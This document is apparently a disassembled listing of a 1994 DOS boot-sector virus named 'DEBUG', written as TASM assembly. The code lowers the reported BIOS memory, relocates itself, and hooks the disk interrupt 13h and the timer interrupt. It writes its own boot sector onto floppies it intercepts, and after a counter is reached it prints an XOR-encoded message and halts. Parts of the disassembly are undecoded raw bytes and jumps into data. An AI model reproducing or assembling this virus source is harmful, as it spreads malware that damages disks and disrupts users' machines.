
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€					                                 €€
;€€				DEBUG	                                 €€
;€€					                                 €€
;€€      Created:   16-Sep-94		                                 €€
;€€      Passes:    5          Analysis	Options on: none                 €€
;€€					                                 €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

target		EQU   'T3'                      ; Target assembler: TASM-3.1

include  srmacros.inc


; The following equates show data references outside the range of the program.

data_1e		equ	6
data_2e		equ	0Eh
data_3e		equ	417h
data_4e		equ	46Eh
data_5e		equ	24h
data_6e		equ	26h
data_7e		equ	4Ch
data_8e		equ	4Eh
data_13e	equ	413h			;*
data_14e	equ	46Eh			;*
data_15e	equ	7C00h			;*
data_16e	equ	7CD3h			;*
data_18e	equ	7D25h			;*
data_19e	equ	7DBDh			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

debug		proc	far

start:
		jmp	short real_start
			                        ;* No entry point to code
		nop
		push	si
		inc	di
		inc	cx
		inc	bx
		push	ax
		db	 36h, 30h, 33h, 00h, 02h, 01h
		db	 01h, 00h, 02h, 70h, 00h, 68h
		db	 06h,0F9h, 05h, 00h, 0Ah, 00h
		db	 02h
		db	9 dup (0)
		db	 01h, 00h, 29h,0EDh, 93h, 26h
		db	 1Dh
		db	'NO NAME    FAT12   '

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

real_start:
		cli				; Disable interrupts
		push	cs
		pop	ds
		mov	ax,ds:data_7e
		mov	ds:data_16e,ax
		mov	ax,ds:data_8e
		mov	word ptr ds:data_16e+2,ax
		mov	al,ds:data_14e
		mov	ds:data_19e,al
		mov	ax,ds:data_13e
		dec	ax
		mov	ds:data_13e,ax
		mov	cl,6
		shl	ax,cl			; Shift w/zeros fill
		sub	ax,7C0h
		mov	ds:data_8e,ax
		mov	ds:data_6e,ax
		mov	word ptr ds:data_7e,7C82h
		mov	word ptr ds:data_5e,7D62h
		mov	si,data_15e
		mov	di,si
		mov	es,ax
		mov	cx,100h
		cld				; Clear direction
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		int	19h			; Bootstrap loader
		cmp	ah,0AAh
		jne	loc_1			; Jump if not equal
		iret				; Interrupt return
loc_1:
		cmp	ah,2
		jne	loc_4			; Jump if not equal
		cmp	cx,1
		jne	loc_4			; Jump if not equal
		cmp	dh,0
		jne	loc_4			; Jump if not equal
		push	ax
		push	bx
		push	si
		push	di
		pushf				; Push flags
		call	dword ptr cs:data_16e
		jnc	loc_2			; Jump if carry=0
		jmp	short loc_5
loc_2:
		cmp	word ptr es:[1FEh][bx],0AA55h
		je	loc_3			; Jump if equal
		jmp	short $+29h
		db	 26h, 80h,0BFh,0BCh, 01h,0C9h
		db	 74h, 7Ah,0E8h, 8Bh, 00h,0E8h
data_10		db	31h			; Data table (indexed access)
		db	 00h, 8Bh,0F3h, 80h,0FAh, 79h
		db	 77h, 1Eh, 83h,0C6h, 02h,0BFh
		db	 02h, 7Ch,0B9h, 1Eh, 00h, 32h
		db	0F6h,0EBh, 30h,0EAh, 85h,0A5h
		db	 00h,0F0h
		db	0B8h, 01h, 00h,0F8h
loc_5:
		pop	di
		pop	si
		pop	bx
		inc	sp
		inc	sp
		retf	2			; Return far
loc_6:
		add	si,1BEh
		mov	di,7DBEh
		mov	cx,20h
		jmp	short $+15h

debug		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
		mov	ax,301h
		pushf				; Push flags
		call	dword ptr cs:data_16e
		jnc	loc_ret_7		; Jump if carry=0
		pop	bx
		mov	cl,1
		xor	dh,dh			; Zero register
		jmp	short $-28h

loc_ret_7:
		retn
sub_1		endp

			                        ;* No entry point to code
		push	ds
		push	es
		pop	ds
		push	cs
		pop	es
		cld				; Clear direction
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		mov	cx,1
		mov	bx,7C00h
		mov	ax,301h
		pushf				; Push flags
		call	dword ptr cs:data_16e
		jc	$-0Fh			; Jump if carry Set
		push	ds
		pop	es
		inc	byte ptr cs:data_19e
		pop	ds
		jmp	short $-4Ch
			                        ;* No entry point to code
		add	ax,714h
		sbb	al,1
		or	al,75h			; 'u'
		push	ss
		sbb	ax,1610h
		push	ds
		db	0FFh
loc_8:
		call	sub_2
		pop	di
		pop	si
		pop	bx
		pop	ax
		pushf				; Push flags
		call	dword ptr cs:data_16e
		xor	dh,dh			; Zero register
		mov	cl,1
		retf	2			; Return far

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		cmp	dl,79h			; 'y'
		ja	loc_10			; Jump if above
		mov	ax,es:[bx+16h]
		mov	dh,1
		cmp	al,3
		jae	loc_9			; Jump if above or =
		mov	cl,3
		retn
loc_9:
		cmp	al,7
		jae	loc_10			; Jump if above or =
		mov	cl,5
		retn
loc_10:
		mov	cl,0Eh
		retn
sub_2		endp

			                        ;* No entry point to code
		push	ax
		push	ds
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	al,ds:data_3e
		and	al,0Ch
		cmp	al,0Ch
		jne	loc_11			; Jump if not equal
		in	al,60h			; port 60h, keybd scan or sw1
		cmp	al,53h			; 'S'
		jne	loc_11			; Jump if not equal
		in	al,61h			; port 61h, 8255 port B, read
		push	ax
		or	al,80h
		out	61h,al			; port 61h, 8255 B - spkr, etc
		pop	ax
		out	61h,al			; port 61h, 8255 B - spkr, etc
						;  al = 0, disable parity
		mov	ax,2
		int	10h			; Video display   ah=functn 00h
						;  set display mode in al
		mov	al,20h			; ' '
		out	20h,al			; port 20h, 8259-1 int command
						;  al = 20h, end of interrupt
		int	19h			; Bootstrap loader
loc_11:
		mov	al,ds:data_4e
		mov	ds:data_1e,ax
		mov	ds:data_2e,ax
		push	cs
		pop	ds
		cmp	al,ds:data_19e
		jbe	$+1Ah			; Jump if below or =
		xor	ax,ax			; Zero register
		int	10h			; Video display   ah=functn 00h
						;  set display mode in al
		mov	si,data_18e
loc_12:
		mov	ah,0Eh
		xor	bx,bx			; Zero register
		cld				; Clear direction
		lodsb				; String [si] to al
		cmp	al,0FFh
		je	loc_13			; Jump if equal
		xor	al,55h			; 'U'
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_12
loc_13:
		hlt				; Halt processor
		pop	ds
		pop	ax
		jmp	far ptr $-1930h
		db	0C9h, 0Fh, 80h, 01h, 01h, 00h
		db	 06h, 0Eh,0E2h,0E7h, 22h, 00h
		db	 00h, 00h, 0Eh,0C8h, 07h
		db	49 dup (0)
		db	 55h,0AAh

seg_a		ends



		end	start
